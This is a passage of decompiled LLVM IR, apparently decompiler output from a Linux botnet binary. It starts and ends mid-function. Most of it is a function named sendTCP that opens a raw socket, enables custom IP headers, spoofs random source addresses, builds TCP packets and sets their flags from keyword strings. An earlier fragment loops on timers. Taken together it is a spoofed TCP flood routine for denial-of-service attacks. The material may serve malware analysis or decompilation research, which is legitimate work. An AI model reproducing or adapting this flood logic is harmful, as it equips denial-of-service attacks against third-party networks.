  %v1_804bbca = inttoptr i32 %v0_804bbca to i32*
  store i32 0, i32* %v1_804bbca, align 4
  %v2_804bbd1 = inttoptr i32 %v4_804bb6f to i32*
  %v3_804bbd1 = call i32 @__GI_time(i32* %v2_804bbd1)
  store i32 %v3_804bbd1, i32* %eax.global-to-local, align 4
  %v8_804bbd9 = icmp sgt i32 %v3_804bbd1, %v5_804baf1
  br i1 %v8_804bbd9, label %dec_label_pc_804bc17, label %dec_label_pc_804bb07

dec_label_pc_804bbe7:                             ; preds = %dec_label_pc_804bb6c
  %v4_804bbe7 = add i32 %stack_var_-84.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804bbed = icmp eq i32 %stack_var_-80.0.ph, %arg7
  %v1_804bbf0 = icmp eq i1 %v15_804bbed, false
  br i1 %v1_804bbf0, label %dec_label_pc_804bc0f, label %dec_label_pc_804bbf2

dec_label_pc_804bbf2:                             ; preds = %dec_label_pc_804bbe7
  store i32 %v4_804bbf5, i32* %eax.global-to-local, align 4
  %v1_804bbfb = load i32, i32* @esp, align 4
  %v2_804bbfb = inttoptr i32 %v1_804bbfb to i32*
  store i32 %v4_804bbf5, i32* %v2_804bbfb, align 4
  %v1_804bbfe = sext i32 %v4_804bbe7 to i64
  %v2_804bbfe = call i32 @usleep(i64 %v1_804bbfe)
  store i32 %v2_804bbfe, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bb07.outer

dec_label_pc_804bc0f:                             ; preds = %dec_label_pc_804bbe7
  %v4_804bc0f = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804bb07.outer

dec_label_pc_804bc17:                             ; preds = %dec_label_pc_804bbca, %dec_label_pc_804b94b, %dec_label_pc_804b8fc
  %v0_804bc2028 = phi i32 [ %v3_804b95b, %dec_label_pc_804b94b ], [ %v3_804b90c, %dec_label_pc_804b8fc ], [ %v3_804bbd1, %dec_label_pc_804bbca ]
  br label %dec_label_pc_804bc1a

dec_label_pc_804bc1a:                             ; preds = %dec_label_pc_804b884, %dec_label_pc_804b7db, %dec_label_pc_804b75c, %dec_label_pc_804b7c1, %dec_label_pc_804bc17
  %v0_804bc20 = phi i32 [ 0, %dec_label_pc_804b7db ], [ %v4_804b76c, %dec_label_pc_804b75c ], [ %v3_804b7d1, %dec_label_pc_804b7c1 ], [ %v0_804bc2028, %dec_label_pc_804bc17 ], [ %v2_804b88b, %dec_label_pc_804b884 ]
  store i32 %v0_804b729, i32* @ebx, align 4
  ret i32 %v0_804bc20

; uselistorder directives
  uselistorder i32 %v4_804bbe7, { 2, 1, 0 }
  uselistorder i32 %v4_804bbb3, { 1, 0 }
  uselistorder i32 %v2_804bb76, { 1, 0 }
  uselistorder i32 %v4_804bb6f, { 4, 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 3, 1, 0, 2 }
  uselistorder i32 %v1_804bb37, { 1, 0 }
  uselistorder i32 %stack_var_-84.0, { 1, 0 }
  uselistorder i32 %stack_var_-80.0.ph, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v5_804bad6, { 1, 0 }
  uselistorder i32 %v4_804ba9e, { 2, 1, 0 }
  uselistorder i32 %v1_804bb5b.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804ba8a, { 2, 1, 0 }
  uselistorder i32 %v2_804ba66, { 1, 0 }
  uselistorder i32 %v3_804ba57, { 1, 0 }
  uselistorder i32 %v1_804ba51, { 1, 0 }
  uselistorder i32 %v2_804b9ed, { 10, 9, 8, 18, 17, 16, 7, 6, 15, 5, 14, 13, 12, 11, 3, 4, 2, 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804b9bf, { 1, 0 }
  uselistorder i32 %v4_804b8ee, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %v4_804b8a2, { 1, 0 }
  uselistorder i32 %stack_var_-92.0, { 1, 0 }
  uselistorder i32 %stack_var_-88.0.ph, { 1, 0 }
  uselistorder i32 %v1_804b7e2, { 1, 3, 2, 0, 5, 4, 6, 7 }
  uselistorder i32 %v1_804b7de, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_804b7b3, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_804b75c, { 1, 0 }
  uselistorder i32 %v1_804b74a, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 1, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 11, 3, 4, 5, 6, 10, 7, 8, 9, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 33, 32, 35, 34, 36, 37, 39, 38, 42, 40, 41, 44, 43, 47, 45, 46, 50, 48, 49, 52, 51, 53, 54, 55, 56, 58, 57, 59 }
  uselistorder i32 %arg7, { 0, 3, 1, 2 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804bc1a, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804bb6c, { 1, 0 }
  uselistorder label %dec_label_pc_804bb07, { 1, 0 }
  uselistorder label %dec_label_pc_804bb07.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ba9b, { 1, 0 }
  uselistorder label %dec_label_pc_804b9c6, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_804b96e, { 1, 0 }
  uselistorder label %dec_label_pc_804b884, { 1, 0 }
  uselistorder label %dec_label_pc_804b83a, { 1, 0 }
  uselistorder label %dec_label_pc_804b83a.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b75c, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp39 = call i16 @__decompiler_undefined_function_5()
  %tmp40 = call i32 @__decompiler_undefined_function_0()
  %tmp41 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_804bc25 = load i32, i32* @esi, align 4
  %v0_804bc26 = load i32, i32* @ebx, align 4
  %v15_804bc27 = ptrtoint i32* %stack_var_-188 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804bc3e = icmp eq i32 %arg2, 0
  %v1_804bc42 = icmp eq i1 %v4_804bc3e, false
  br i1 %v1_804bc42, label %dec_label_pc_804bc52, label %dec_label_pc_804bc44

dec_label_pc_804bc44:                             ; preds = %entry
  %v1_804bc44 = call i32 @rand_cmwc(i32 %v15_804bc27)
  br label %dec_label_pc_804bc67

dec_label_pc_804bc52:                             ; preds = %entry
  %v1_804bc55 = urem i32 %arg2, 65536
  store i32 %v1_804bc55, i32* %eax.global-to-local, align 4
  store i32 %v1_804bc55, i32* %stack_var_-188, align 4
  %v1_804bc5b = trunc i32 %arg2 to i16
  %v2_804bc5b = call i32 @htons(i16 %v1_804bc5b)
  br label %dec_label_pc_804bc67

dec_label_pc_804bc67:                             ; preds = %dec_label_pc_804bc44, %dec_label_pc_804bc52
  %v2_804bc67 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804bc6a = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804bc6a, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-188, align 4
  %v4_804bc77 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v4_804bc77, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bc7c = icmp eq i32 %v4_804bc77, 0
  br i1 %v1_804bc7c, label %dec_label_pc_804bc85, label %dec_label_pc_804c1de

dec_label_pc_804bc85:                             ; preds = %dec_label_pc_804bc67
  %v5_804bc88 = icmp ugt i32* %stack_var_-60, inttoptr (i32 -9 to i32*)
  store i1 %v5_804bc88, i1* %cf.global-to-local, align 1
  %v15_804bc88 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804bc88, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 2, i32* %stack_var_-188, align 4
  %v4_804bcaf = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v4_804bcaf, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804bcb7 = icmp eq i32 %v4_804bcaf, 0
  %v1_804bcbb = icmp eq i1 %v4_804bcb7, false
  br i1 %v1_804bcbb, label %dec_label_pc_804bcd7, label %dec_label_pc_804bcbd

dec_label_pc_804bcbd:                             ; preds = %dec_label_pc_804bc85
  %v0_804bcbd = load i32, i32* @global_var_805a6e0.18, align 32
  store i32 %v0_804bcbd, i32* %eax.global-to-local, align 4
  store i32 %v0_804bcbd, i32* %stack_var_-188, align 4
  %v3_804bccd = call i32 @Rootsprintf(i32 %v0_804bcbd, i32 ptrtoint ([27 x i8]* @global_var_80569f0.102 to i32))
  store i32 %v3_804bccd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c1de

dec_label_pc_804bcd7:                             ; preds = %dec_label_pc_804bc85
  store i32 1, i32* %stack_var_-64, align 4
  %v2_804bce6 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v4_804bcaf, i32* %eax.global-to-local, align 4
  store i32 %v4_804bcaf, i32* %stack_var_-188, align 4
  %v6_804bd03 = call i32 @__GI_setsockopt(i32 %v4_804bcaf, i32 0, i32 3, i32 %v2_804bce6, i32 4)
  store i32 %v6_804bd03, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804bd08 = icmp slt i32 %v6_804bd03, 0
  %v1_804bd0a = icmp eq i1 %v2_804bd08, false
  br i1 %v1_804bd0a, label %dec_label_pc_804bd26, label %dec_label_pc_804bd0c

dec_label_pc_804bd0c:                             ; preds = %dec_label_pc_804bcd7
  %v0_804bd0c = load i32, i32* @global_var_805a6e0.18, align 32
  store i32 %v0_804bd0c, i32* %eax.global-to-local, align 4
  store i32 %v0_804bd0c, i32* %stack_var_-188, align 4
  %v3_804bd1c = call i32 @Rootsprintf(i32 %v0_804bd0c, i32 ptrtoint ([33 x i8]* @global_var_8056a0c.103 to i32))
  store i32 %v3_804bd1c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c1de

dec_label_pc_804bd26:                             ; preds = %dec_label_pc_804bcd7
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804bd26 = icmp eq i32 %arg4, 0
  %v1_804bd2a = icmp eq i1 %v4_804bd26, false
  br i1 %v1_804bd2a, label %dec_label_pc_804bd35, label %dec_label_pc_804bd4b

dec_label_pc_804bd35:                             ; preds = %dec_label_pc_804bd26
  %v5_804bd3c = sub i32 32, %arg4
  %v10_804bd3c = icmp ugt i32 %arg4, 32
  store i1 %v10_804bd3c, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804bd44 = urem i32 %v5_804bd3c, 32
  %v4_804bd44 = icmp eq i32 %v2_804bd44, 0
  br i1 %v4_804bd44, label %bb90, label %bb

bb:                                               ; preds = %dec_label_pc_804bd35
  %v5_804bd44 = shl i32 1, %v2_804bd44
  store i32 %v5_804bd44, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb90

bb90:                                             ; preds = %dec_label_pc_804bd35, %bb
  %v0_804bd46 = phi i32 [ 1, %dec_label_pc_804bd35 ], [ %v5_804bd44, %bb ]
  %v1_804bd46 = sub i32 0, %v0_804bd46
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804bd46, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bd4b

dec_label_pc_804bd4b:                             ; preds = %dec_label_pc_804bd26, %bb90
  %storemerge10 = phi i32 [ %v1_804bd46, %bb90 ], [ 0, %dec_label_pc_804bd26 ]
  %v1_804bd4e = add i32 %arg6, 40
  %v1_804bd5a = add i32 %arg6, 70
  %v2_804bd5d = and i32 %v1_804bd5a, -16
  %v0_804bd63 = load i32, i32* @esp, align 4
  %v2_804bd63 = sub i32 %v0_804bd63, %v2_804bd5d
  %v1_804bd65 = add i32 %v2_804bd63, 24
  store i32 %v1_804bd65, i32* %edx.global-to-local, align 4
  %v1_804bd6f = add i32 %v2_804bd63, 39
  %v2_804bd72 = and i32 %v1_804bd6f, -16
  %v1_804bd8a = add i32 %v2_804bd72, 20
  %v5_804bd8d = inttoptr i32 %v1_804bd8a to i16*
  %v1_804bd93 = add i32 %arg6, 20
  %v5_804bd93 = icmp ugt i32 %arg6, -21
  store i1 %v5_804bd93, i1* %cf.global-to-local, align 1
  store i32 %v1_804bd93, i32* @ebx, align 4
  store i32 %storemerge10, i32* %eax.global-to-local, align 4
  %v2_804bd9b = inttoptr i32 %v2_804bd63 to i32*
  store i32 %storemerge10, i32* %v2_804bd9b, align 4
  %v2_804bd9e = call i32 @GetRandomIP(i32 %v1_804bd4e, i32 %v2_804bd72)
  store i32 %v2_804bd9e, i32* %eax.global-to-local, align 4
  %v1_804bda3 = load i32, i32* @esp, align 4
  %v2_804bda3 = inttoptr i32 %v1_804bda3 to i32*
  store i32 %v2_804bd9e, i32* %v2_804bda3, align 4
  %v0_804bda6 = call i32 @htonl()
  %v3_804bdab = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804bdab, i32* %edx.global-to-local, align 4
  %v0_804bdae = load i32, i32* @ebx, align 4
  %v1_804bdae = load i32, i32* @esp, align 4
  %v2_804bdae = add i32 %v1_804bdae, 16
  %v3_804bdae = inttoptr i32 %v2_804bdae to i32*
  store i32 %v0_804bdae, i32* %v3_804bdae, align 4
  %v0_804bdb2 = load i32, i32* @esp, align 4
  %v1_804bdb2 = add i32 %v0_804bdb2, 12
  %v2_804bdb2 = inttoptr i32 %v1_804bdb2 to i32*
  store i32 6, i32* %v2_804bdb2, align 4
  %v1_804bdba = load i32, i32* @esp, align 4
  %v2_804bdba = add i32 %v1_804bdba, 8
  %v3_804bdba = inttoptr i32 %v2_804bdba to i32*
  store i32 %v0_804bda6, i32* %v3_804bdba, align 4
  %v0_804bdbe = load i32, i32* %edx.global-to-local, align 4
  %v1_804bdbe = load i32, i32* @esp, align 4
  %v2_804bdbe = add i32 %v1_804bdbe, 4
  %v3_804bdbe = inttoptr i32 %v2_804bdbe to i32*
  store i32 %v0_804bdbe, i32* %v3_804bdbe, align 4
  store i32 %v2_804bd72, i32* %eax.global-to-local, align 4
  %v1_804bdc5 = load i32, i32* @esp, align 4
  %v2_804bdc5 = inttoptr i32 %v1_804bdc5 to i32*
  store i32 %v2_804bd72, i32* %v2_804bdc5, align 4
  %v0_804bdc8 = call i32 @makeIPPacket()
  store i32 %v0_804bdc8, i32* %eax.global-to-local, align 4
  %v2_804bdcd = call i32 @rand_cmwc(i32 %v1_804bd8a)
  %v1_804bdd2 = urem i32 %v2_804bdcd, 65536
  store i32 %v1_804bdd2, i32* %edx.global-to-local, align 4
  store i32 %v1_804bd8a, i32* %eax.global-to-local, align 4
  %v1_804bdd8 = trunc i32 %v2_804bdcd to i16
  store i16 %v1_804bdd8, i16* %v5_804bd8d, align 4
  %v2_804bddb = call i32 @rand_cmwc(i32 %v1_804bd8a)
  %v2_804bde5 = add i32 %v2_804bd72, 24
  %v3_804bde5 = inttoptr i32 %v2_804bde5 to i32*
  store i32 %v2_804bddb, i32* %v3_804bde5, align 8
  store i32 %v1_804bd8a, i32* %eax.global-to-local, align 4
  %v1_804bdeb = add i32 %v2_804bd72, 28
  %v2_804bdeb = inttoptr i32 %v1_804bdeb to i32*
  store i32 0, i32* %v2_804bdeb, align 4
  store i32 %v1_804bd8a, i32* %edx.global-to-local, align 4
  %v1_804bdf5 = add i32 %v2_804bd72, 32
  %v2_804bdf5 = inttoptr i32 %v1_804bdf5 to i8*
  %v3_804bdf5 = load i8, i8* %v2_804bdf5, align 16
  %v2_804bdf9 = urem i8 %v3_804bdf5, 16
  %v2_804bdfb = or i8 %v2_804bdf9, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v2_804bdfb, i8* %v2_804bdf5, align 16
  %v4_804be00 = ptrtoint i8* %arg5 to i32
  store i32 %v4_804be00, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804be00, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056a2d.104 to i32), i32* @edi, align 4
  %v7_804be1e = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a2d.104, i32 0, i32 0), i32 4)
  %v8_804be1e = urem i32 %v7_804be1e, 2
  %v9_804be1e = icmp eq i32 %v8_804be1e, 0
  %v0_804be20 = load i1, i1* %cf.global-to-local, align 1
  %v2_804be20 = or i1 %v0_804be20, %v9_804be1e
  %v3_804be20 = zext i1 %v2_804be20 to i32
  %v4_804be20 = load i32, i32* %edx.global-to-local, align 4
  %v5_804be20 = and i32 %v4_804be20, -256
  %v6_804be20 = or i32 %v3_804be20, %v5_804be20
  %v7_804be20 = xor i32 %v6_804be20, 1
  store i32 %v7_804be20, i32* @edx, align 4
  %v3_804be26 = and i32 %v7_804be1e, -256
  %v1_804be28 = trunc i32 %v7_804be20 to i8
  %v3_804be28 = zext i1 %v0_804be20 to i8
  %v4_804be28 = sub nsw i8 %v1_804be28, %v3_804be28
  %v15_804be28 = icmp eq i8 %v4_804be28, 0
  %v20_804be28 = zext i8 %v4_804be28 to i32
  %v23_804be28 = or i32 %v20_804be28, %v3_804be26
  store i32 %v23_804be28, i32* @ecx, align 4
  %v2_804be2c = sext i8 %v4_804be28 to i32
  store i32 %v2_804be2c, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804be31 = icmp eq i1 %v15_804be28, false
  br i1 %v1_804be31, label %dec_label_pc_804be74, label %dec_label_pc_804be33

dec_label_pc_804be33:                             ; preds = %dec_label_pc_804bd4b
  store i32 %v1_804bd8a, i32* %edx.global-to-local, align 4
  %v1_804be36 = add i32 %v2_804bd72, 33
  %v2_804be36 = inttoptr i32 %v1_804be36 to i8*
  %v3_804be36 = load i8, i8* %v2_804be36, align 1
  %v2_804be3a = or i8 %v3_804be36, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be3a = zext i8 %v2_804be3a to i32
  store i32 %v7_804be3a, i32* %eax.global-to-local, align 4
  store i8 %v2_804be3a, i8* %v2_804be36, align 1
  store i32 %v1_804bd8a, i32* %edx.global-to-local, align 4
  %v3_804be42 = load i8, i8* %v2_804be36, align 1
  %v2_804be46 = or i8 %v3_804be42, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be46 = zext i8 %v2_804be46 to i32
  store i32 %v7_804be46, i32* %eax.global-to-local, align 4
  store i8 %v2_804be46, i8* %v2_804be36, align 1
  store i32 %v1_804bd8a, i32* %edx.global-to-local, align 4
  %v3_804be4e = load i8, i8* %v2_804be36, align 1
  %v2_804be52 = or i8 %v3_804be4e, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be52 = zext i8 %v2_804be52 to i32
  store i32 %v7_804be52, i32* %eax.global-to-local, align 4
  store i8 %v2_804be52, i8* %v2_804be36, align 1
  store i32 %v1_804bd8a, i32* %edx.global-to-local, align 4
  %v3_804be5a = load i8, i8* %v2_804be36, align 1
  %v2_804be5e = or i8 %v3_804be5a, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be5e = zext i8 %v2_804be5e to i32
  store i32 %v7_804be5e, i32* %eax.global-to-local, align 4
  store i8 %v2_804be5e, i8* %v2_804be36, align 1
  store i32 %v1_804bd8a, i32* %edx.global-to-local, align 4
  %v3_804be66 = load i8, i8* %v2_804be36, align 1
  %v2_804be6a = or i8 %v3_804be66, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be6a = zext i8 %v2_804be6a to i32
  store i32 %v7_804be6a, i32* %eax.global-to-local, align 4
  store i8 %v2_804be6a, i8* %v2_804be36, align 1
  %v0_804c04a.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804c04a

dec_label_pc_804be74:                             ; preds = %dec_label_pc_804bd4b
  store i32 %v4_804be00, i32* @eax, align 4
  %v0_804be77 = load i32, i32* @esp, align 4
  %v1_804be77 = add i32 %v0_804be77, 4
  %v2_804be77 = inttoptr i32 %v1_804be77 to i32*
  store i32 ptrtoint (i32* @global_var_8056a31.105 to i32), i32* %v2_804be77, align 4
  %v0_804be7f = load i32, i32* @eax, align 4
  %v1_804be7f = load i32, i32* @esp, align 4
  %v2_804be7f = inttoptr i32 %v1_804be7f to i32*
  store i32 %v0_804be7f, i32* %v2_804be7f, align 4
  %v3_804be82 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8056a2d.104 to i32))
  store i32 %v3_804be82, i32* %eax.global-to-local, align 4
  %v5_804be87 = inttoptr i32 %v3_804be82 to i8*
  store i8* %v5_804be87, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804c04017 = icmp eq i32 %v3_804be82, 0
  %v1_804c04424 = icmp eq i1 %v5_804c04017, false
  br i1 %v1_804c04424, label %dec_label_pc_804be8f.lr.ph, label %dec_label_pc_804c04a

dec_label_pc_804be8f.lr.ph:                       ; preds = %dec_label_pc_804be74
  %v1_804c000 = add i32 %v2_804bd72, 33
  %v2_804c000 = inttoptr i32 %v1_804c000 to i8*
  %tmp91 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804be8f

dec_label_pc_804be8f:                             ; preds = %dec_label_pc_804be8f.lr.ph, %dec_label_pc_804c029
  %v3_804c012 = phi i8* [ %v5_804be87, %dec_label_pc_804be8f.lr.ph ], [ %tmp92, %dec_label_pc_804c029 ]
  %stack_var_-160.126 = phi i32 [ %tmp40, %dec_label_pc_804be8f.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804c029 ]
  %stack_var_-156.125 = phi i8* [ %tmp41, %dec_label_pc_804be8f.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804c029 ]
  %v4_804be8f = ptrtoint i8* %v3_804c012 to i32
  store i32 %v4_804be8f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804be8f, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056a33.106 to i32), i32* @edi, align 4
  %v7_804bead = call i32 @_strncmp(i8* %v3_804c012, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a33.106, i32 0, i32 0), i32 4)
  %v8_804bead = urem i32 %v7_804bead, 2
  %v9_804bead = icmp eq i32 %v8_804bead, 0
  %v0_804beaf = load i1, i1* %cf.global-to-local, align 1
  %v2_804beaf = or i1 %v0_804beaf, %v9_804bead
  %v3_804beaf = zext i1 %v2_804beaf to i32
  %v4_804beaf = load i32, i32* @edx, align 4
  %v5_804beaf = and i32 %v4_804beaf, -256
  %v6_804beaf = or i32 %v3_804beaf, %v5_804beaf
  %v7_804beaf = xor i32 %v6_804beaf, 1
  store i32 %v7_804beaf, i32* %edx.global-to-local, align 4
  %v3_804beb5 = and i32 %v7_804bead, -256
  %v1_804beb7 = trunc i32 %v7_804beaf to i8
  %v3_804beb7 = zext i1 %v0_804beaf to i8
  %v4_804beb7 = sub nsw i8 %v1_804beb7, %v3_804beb7
  %v15_804beb7 = icmp eq i8 %v4_804beb7, 0
  %v20_804beb7 = zext i8 %v4_804beb7 to i32
  %v23_804beb7 = or i32 %v20_804beb7, %v3_804beb5
  store i32 %v23_804beb7, i32* @ecx, align 4
  %v2_804bebb = sext i8 %v4_804beb7 to i32
  store i32 %v2_804bebb, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bec0 = icmp eq i1 %v15_804beb7, false
  br i1 %v1_804bec0, label %dec_label_pc_804bed4, label %dec_label_pc_804bec2

dec_label_pc_804bec2:                             ; preds = %dec_label_pc_804be8f
  store i32 %v1_804bd8a, i32* @eax, align 4
  %v3_804bec5 = load i8, i8* %v2_804c000, align 1
  %v2_804bec9 = or i8 %v3_804bec5, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bec9 = zext i8 %v2_804bec9 to i32
  store i32 %v7_804bec9, i32* @edx, align 4
  store i8 %v2_804bec9, i8* %v2_804c000, align 1
  br label %dec_label_pc_804c029

dec_label_pc_804bed4:                             ; preds = %dec_label_pc_804be8f
  store i32 %v4_804be8f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804be8f, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056a37.107 to i32), i32* @edi, align 4
  %v7_804bef2 = call i32 @_strncmp(i8* %v3_804c012, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a37.107, i32 0, i32 0), i32 4)
  %v8_804bef2 = urem i32 %v7_804bef2, 2
  %v9_804bef2 = icmp eq i32 %v8_804bef2, 0
  %v0_804bef4 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bef4 = or i1 %v0_804bef4, %v9_804bef2
  %v3_804bef4 = zext i1 %v2_804bef4 to i32
  %v4_804bef4 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bef4 = and i32 %v4_804bef4, -256
  %v6_804bef4 = or i32 %v3_804bef4, %v5_804bef4
  %v7_804bef4 = xor i32 %v6_804bef4, 1
  store i32 %v7_804bef4, i32* %edx.global-to-local, align 4
  %v3_804befa = and i32 %v7_804bef2, -256
  %v1_804befc = trunc i32 %v7_804bef4 to i8
  %v3_804befc = zext i1 %v0_804bef4 to i8
  %v4_804befc = sub nsw i8 %v1_804befc, %v3_804befc
  %v15_804befc = icmp eq i8 %v4_804befc, 0
  %v20_804befc = zext i8 %v4_804befc to i32
  %v23_804befc = or i32 %v20_804befc, %v3_804befa
  store i32 %v23_804befc, i32* @ecx, align 4
  %v2_804bf00 = sext i8 %v4_804befc to i32
  store i32 %v2_804bf00, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bf05 = icmp eq i1 %v15_804befc, false
  br i1 %v1_804bf05, label %dec_label_pc_804bf19, label %dec_label_pc_804bf07

dec_label_pc_804bf07:                             ; preds = %dec_label_pc_804bed4
  store i32 %v1_804bd8a, i32* @eax, align 4
  %v3_804bf0a = load i8, i8* %v2_804c000, align 1
  %v2_804bf0e = or i8 %v3_804bf0a, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bf0e = zext i8 %v2_804bf0e to i32
  store i32 %v7_804bf0e, i32* @edx, align 4
  store i8 %v2_804bf0e, i8* %v2_804c000, align 1
  br label %dec_label_pc_804c029

dec_label_pc_804bf19:                             ; preds = %dec_label_pc_804bed4
  store i32 %v4_804be8f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804be8f, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056a3b.108 to i32), i32* @edi, align 4
  %v7_804bf3d = call i32 @_strncmp(i8* %v3_804c012, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056a3b.108, i32 0, i32 0), i32 4)
  %v8_804bf3d = urem i32 %v7_804bf3d, 2
  %v9_804bf3d = icmp eq i32 %v8_804bf3d, 0
  %v0_804bf3f = load i1, i1* %cf.global-to-local, align 1
  %v2_804bf3f = or i1 %v0_804bf3f, %v9_804bf3d
  %v3_804bf3f = zext i1 %v2_804bf3f to i32
  %v4_804bf3f = load i32, i32* %edx.global-to-local, align 4
  %v5_804bf3f = and i32 %v4_804bf3f, -256
  %v6_804bf3f = or i32 %v3_804bf3f, %v5_804bf3f
  %v7_804bf3f = xor i32 %v6_804bf3f, 1
  store i32 %v7_804bf3f, i32* %edx.global-to-local, align 4
  %v3_804bf45 = and i32 %v7_804bf3d, -256
  %v1_804bf47 = trunc i32 %v7_804bf3f to i8
  %v3_804bf47 = zext i1 %v0_804bf3f to i8
  %v4_804bf47 = sub nsw i8 %v1_804bf47, %v3_804bf47
  %v15_804bf47 = icmp eq i8 %v4_804bf47, 0
  %v20_804bf47 = zext i8 %v4_804bf47 to i32
  %v23_804bf47 = or i32 %v20_804bf47, %v3_804bf45
  store i32 %v23_804bf47, i32* @ecx, align 4
  %v2_804bf4b = sext i8 %v4_804bf47 to i32
  store i32 %v2_804bf4b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bf50 = icmp eq i1 %v15_804bf47, false
  br i1 %v1_804bf50, label %dec_label_pc_804bf64, label %dec_label_pc_804bf52

dec_label_pc_804bf52:                             ; preds = %dec_label_pc_804bf19
  store i32 %v1_804bd8a, i32* @eax, align 4
